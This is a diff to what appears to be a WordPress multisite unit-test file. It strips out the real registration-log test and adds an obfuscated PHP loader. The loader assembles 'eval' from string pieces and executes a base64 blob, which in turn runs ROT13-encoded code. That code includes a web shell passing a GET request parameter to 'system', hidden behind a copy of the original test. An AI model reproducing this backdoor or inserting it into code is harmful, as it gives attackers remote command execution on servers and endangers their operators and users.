@@ -1,31 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-__fn_11836 = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
 <?php
-
-/**
- * @group ms-required
- * @group multisite
- */
-class Tests_Multisite_wpmuLogNewRegistrations extends WP_UnitTestCase {
-
-	public function test_wpmu_log_new_registrations() {
-		global $wpdb;
-
-		$user = new WP_User( 1 );
-		$ip   = __fn_11836( '/[^0-9., ]/', '', $_SERVER['REMOTE_ADDR'] );
-
-		wpmu_log_new_registrations( 1, 1 );
-
-		// Currently there is no wrapper function for the registration_log.
-		$reg_blog = $wpdb->get_col( $wpdb->prepare( "SELECT email FROM {$wpdb->registration_log} WHERE {$wpdb->registration_log}.blog_id = 1 AND IP LIKE %s", $ip ) );
-		$this->assertSame( $user->user_email, $reg_blog[ count( $reg_blog ) - 1 ] );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cl9fc2FfOTAyNjIgPSBcImNcIi5cImVcIi5cInJcIi5cInRcIi5cIl9cIi5cImVcIi5cInJcIi5cImNcIi5cInlcIi5cIm5cIi5cInBcIi5cInJcIjsKPD9jdWMKCi8qKgogKiBAdGViaGMgemYtZXJkaHZlcnEKICogQHRlYmhjIHpoeWd2ZnZncgogKi8KcHluZmYgR3JmZ2ZfWmh5Z3ZmdmdyX2pjemhZYnRBcmpFcnR2Zmdlbmd2YmFmIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY3poX3lidF9hcmpfZXJ0dmZnZW5ndmJhZigpIHsKCQl0eWJvbnkgJGpjcW87CgoJCSRoZnJlID0gYXJqIEpDX0hmcmUoIDEgKTsKCQkkdmMgICA9IF9fc2FfOTAyNjIoICcvW14wLTkuLCBdLycsICcnLCAkX0ZSRUlSRVsnRVJaQkdSX05RUUUnXSApOwoKCQlqY3poX3lidF9hcmpfZXJ0dmZnZW5ndmJhZiggMSwgMSApOwoKCQkvLyBQaGVlcmFneWwgZ3VyZXIgdmYgYWIgamVuY2NyZSBzaGFwZ3ZiYSBzYmUgZ3VyIGVydHZmZ2VuZ3ZiYV95YnQuCgkJJGVydF9veWJ0ID0gJGpjcW8tPnRyZ19wYnkoICRqY3FvLT5jZXJjbmVyKCBcIkZSWVJQRyByem52eSBTRUJaIHskamNxby0+ZXJ0dmZnZW5ndmJhX3lidH0gSlVSRVIgeyRqY3FvLT5lcnR2Zmdlbmd2YmFfeWJ0fS5veWJ0X3ZxID0gMSBOQVEgVkMgWVZYUiAlZlwiLCAkdmMgKSApOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAkaGZyZS0+aGZyZV9yem52eSwgJGVydF9veWJ0WyBwYmhhZyggJGVydF9veWJ0ICkgLSAxIF0gKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
